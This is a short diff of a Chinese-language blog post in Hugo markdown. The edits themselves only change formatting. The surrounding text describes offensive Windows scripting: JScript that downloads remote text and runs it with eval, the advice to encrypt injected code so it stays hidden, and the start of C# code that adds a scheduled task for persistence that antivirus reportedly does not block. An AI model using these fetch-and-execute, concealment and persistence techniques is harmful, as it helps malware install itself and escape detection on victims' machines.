@@ -19,10 +19,10 @@ xml.send();
 var aaa=xml.responseText;
 eval(aaa);
 {{< /highlight >}}
-因为是WSH模式的，当然还能用WScript.Arguments.Item(0);的方式来传递代码，可以直接注入一个加密的代码，然后在写一段解密的代码会更隐蔽。
+因为是WSH模式的，当然还能用`WScript.Arguments.Item(0);`的方式来传递代码，可以直接注入一个加密的代码，然后在写一段解密的代码会更隐蔽。
 
 再来谈谈添加自启动，因为程序现在不需要处理上面那些行为，所以杀毒不会拦截，代码：
-{{< highlight js >}}
+{{< highlight csharp>}}
 TaskSchedulerClass scheduler = new TaskSchedulerClass();
 //连接
 scheduler.Connect(null, null, null, null);
